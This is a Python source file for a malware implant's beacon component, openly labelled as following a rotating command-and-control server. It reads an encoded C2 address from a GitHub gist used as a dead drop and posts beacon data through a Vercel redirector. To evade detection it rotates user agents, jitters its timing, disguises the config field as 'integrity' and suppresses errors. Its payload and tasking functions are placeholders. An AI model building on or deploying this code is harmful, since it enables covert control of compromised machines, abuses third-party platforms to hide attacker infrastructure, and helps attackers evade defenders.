# beacon.py — Implant-side logic for following the rotating C2
import requests
import json
import base64
import time
import random
from typing import Any, Dict, Optional

class ChimeraBeacon:
    """
    Implant-side: polls the dead drop, follows the rotating C2 endpoint.
    Implements jittered polling, fallback endpoints, and user-agent rotation.
    """

    def __init__(self, gist_id: str, github_token: Optional[str] = None):
        self.gist_url = f"https://api.github.com/gists/{gist_id}"
        self.headers = {"Accept": "application/vnd.github+json"}
        if github_token:
            self.headers["Authorization"] = f"Bearer {github_token}"

        self._current_endpoint: Optional[str] = None
        self._session_key: str = ""

    def fetch_config(self) -> Dict[str, Any]:
        """Pull current C2 config from dead drop."""
        resp = requests.get(self.gist_url, headers=self.headers, timeout=15)
        resp.raise_for_status()
        gist = resp.json()

        for fdata in gist["files"].values():
            content = fdata.get("content", "")
            if "integrity" in content:
                parsed = json.loads(content)
                encoded = parsed.get("integrity", "")
                if encoded:
                    return json.loads(base64.b64decode(encoded).decode())
        raise ValueError("Dead drop empty or corrupted")

    def beacon(self, payload: bytes) -> bytes:
        """Send beacon data to current C2 endpoint via Vercel redirector."""
        if not self._current_endpoint:
            config: Dict[str, Any] = self.fetch_config()
            self._current_endpoint = str(config["url"])
            self._session_key = str(config.get("key", "") or "")

        # Route through /api/ which Vercel rewrites to Fly VM
        url = f"{self._current_endpoint}/api/beacon"
        headers: Dict[str, str] = {
            "Content-Type": "application/octet-stream",
            "X-CSRF-Token": self._session_key,
            "User-Agent": self._random_ua()
        }

        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=30)
            if resp.status_code == 404:
                # C2 rotated — endpoint is stale, refetch dead drop
                self._current_endpoint = None
                return self.beacon(payload)
            resp.raise_for_status()
            return resp.content
        except requests.ConnectionError:
            # Endpoint gone (rotated) — refetch and retry
            self._current_endpoint = None
            return self.beacon(payload)

    def _random_ua(self) -> str:
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]
        return random.choice(uas)

    def run(self, interval: int = 300, jitter: float = 0.3):
        """Main beacon loop with jittered timing."""
        while True:
            try:
                # Build beacon payload (sysinfo, tasking results, etc.)
                payload = self._build_payload()
                response = self.beacon(payload)
                self._handle_response(response)
            except Exception:
                pass  # stay quiet, retry next cycle

            sleep_time = interval * (1 + random.uniform(-jitter, jitter))
            time.sleep(sleep_time)

    def _build_payload(self) -> bytes:
        # Placeholder — implant-specific beacon data
        return b"\x00\x01\x02"

    def _handle_response(self, data: bytes):
        # Placeholder — parse and execute tasking
        pass
